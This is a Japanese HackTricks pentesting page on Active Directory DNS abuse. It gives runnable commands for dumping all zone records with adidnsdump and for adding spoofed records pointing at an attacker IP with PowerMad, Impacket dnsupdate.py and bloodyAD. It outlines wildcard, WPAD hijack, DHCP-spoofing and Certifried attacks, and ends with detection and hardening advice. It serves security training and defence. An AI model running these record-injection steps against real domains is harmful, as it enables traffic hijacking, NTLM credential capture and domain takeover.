# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

デフォルトでは、Active Directoryの**すべてのユーザー**がドメインまたはフォレストDNSゾーン内の**すべてのDNSレコードを列挙**できます。これはゾーン転送に似ています（ユーザーはAD環境内のDNSゾーンの子オブジェクトをリストできます）。

ツール[**adidnsdump**](https://github.com/dirkjanm/adidnsdump)は、内部ネットワークの偵察目的でゾーン内の**すべてのDNSレコードの列挙**と**エクスポート**を可能にします。
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
> adidnsdump v1.4.0 (2025年4月) は、JSON/Greppable (`--json`) 出力、マルチスレッドDNS解決、およびLDAPSにバインドする際のTLS 1.2/1.3のサポートを追加します。

詳細については、[https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)をお読みください。

---

## レコードの作成 / 修正 (ADIDNSスプーフィング)

**Authenticated Users** グループはデフォルトでゾーンDACLに **Create Child** 権限を持っているため、任意のドメインアカウント（またはコンピュータアカウント）が追加のレコードを登録できます。 これは、トラフィックハイジャック、NTLMリレー強制、または完全なドメイン侵害に利用できます。

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.pyはImpacket ≥0.12.0に付属しています)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## 一般的な攻撃プリミティブ

1. **ワイルドカードレコード** – `*.<zone>` はAD DNSサーバーをLLMNR/NBNSスプーフィングに似た企業全体のレスポンダーに変えます。これを悪用してNTLMハッシュをキャプチャしたり、LDAP/SMBに中継したりできます。（WINSルックアップを無効にする必要があります。）
2. **WPADハイジャック** – `wpad`（または攻撃者ホストを指す**NS**レコード）を追加して、グローバルクエリブロックリストをバイパスし、外向きのHTTPリクエストを透過的にプロキシして資格情報を収集します。Microsoftはワイルドカード/DNAMEバイパス（CVE-2018-8320）を修正しましたが、**NSレコードはまだ機能します**。
3. **古いエントリの取得** – 以前ワークステーションに属していたIPアドレスを主張すると、関連するDNSエントリはまだ解決され、リソースベースの制約付き委任やシャドウ資格情報攻撃をDNSに触れずに実行できます。
4. **DHCP → DNSスプーフィング** – デフォルトのWindows DHCP+DNS展開では、同じサブネット上の認証されていない攻撃者が、動的DNS更新をトリガーする偽のDHCPリクエストを送信することで、既存のAレコード（ドメインコントローラーを含む）を上書きできます（Akamai “DDSpoof”, 2023）。これにより、Kerberos/LDAPに対する中間者攻撃が可能になり、完全なドメイン取得につながる可能性があります。
5. **Certifried (CVE-2022-26923)** – 制御しているマシンアカウントの`dNSHostName`を変更し、一致するAレコードを登録して、その名前の証明書を要求してDCを偽装します。**Certipy**や**BloodyAD**などのツールは、このフローを完全に自動化します。

---

## 検出と強化

* **認証ユーザー**に対して、敏感なゾーンでの*すべての子オブジェクトを作成する*権利を拒否し、動的更新をDHCPで使用される専用アカウントに委任します。
* 動的更新が必要な場合は、ゾーンを**セキュアのみ**に設定し、DHCPで**名前保護**を有効にして、所有者のコンピュータオブジェクトのみが自分のレコードを上書きできるようにします。
* DNSサーバーのイベントID 257/252（動的更新）、770（ゾーン転送）、および`CN=MicrosoftDNS,DC=DomainDnsZones`へのLDAP書き込みを監視します。
* 危険な名前（`wpad`、`isatap`、`*`）を意図的に無害なレコードまたはグローバルクエリブロックリストを介してブロックします。
* DNSサーバーをパッチ適用された状態に保ちます – 例えば、RCEバグCVE-2024-26224およびCVE-2024-26231は**CVSS 9.8**に達し、ドメインコントローラーに対してリモートで悪用可能です。

## 参考文献

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018年、ワイルドカード/WPAD攻撃の事実上のリファレンス)
* Akamai – “DHCP DNS動的更新を悪用したDNSレコードのスプーフィング” (2023年12月)
{{#include ../../banners/hacktricks-training.md}}
